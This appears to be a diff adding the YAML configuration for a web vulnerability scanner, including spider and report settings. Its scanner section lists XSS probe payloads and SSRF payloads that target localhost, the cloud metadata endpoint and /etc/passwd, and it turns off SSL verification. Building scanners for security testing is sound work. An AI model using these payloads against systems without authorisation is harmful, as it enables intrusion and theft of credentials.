@@ -1,0 +1,47 @@
+general:
+  timeout: 10
+  user_agent: "YQHunter/1.0"
+  max_retries: 3
+  proxy: "http://192.168.1.26:7897"
+  concurrency: 20
+  skip_ssl_verify: true
+
+scanner:
+  enable_xss: true
+  enable_ssrf: true
+  enable_cors: true
+  enable_dir_scan: true
+  enable_fingerprint: true
+  enable_api: true
+  xss_payloads:
+    - "<script>alert('XSS')</script>"
+    - "<img src=x onerror=alert('XSS')>"
+    - "javascript:alert('XSS')"
+    - "<svg onload=alert('XSS')>"
+    - "'><script>alert('XSS')</script>"
+    - "\" onerror=alert('XSS')>"
+  ssrf_payloads:
+    - "http://127.0.0.1:80"
+    - "http://localhost:8080"
+    - "http://169.254.169.254/latest/meta-data/"
+    - "http://[::1]"
+    - "file:///etc/passwd"
+    - "http://localhost:22"
+  dir_wordlist: "wordlists/directories.txt"
+  fingerprint_file: "fingerprints.yaml"
+
+spider:
+  max_depth: 3
+  max_pages: 1000
+  follow_links: true
+  allow_domains: []
+  exclude_paths:
+    - "/logout"
+    - "/signout"
+    - "/exit"
+  proxy: "http://192.168.1.26:7897"
+
+report:
+  output_dir: "reports"
+  format: "html"
+  include_details: true
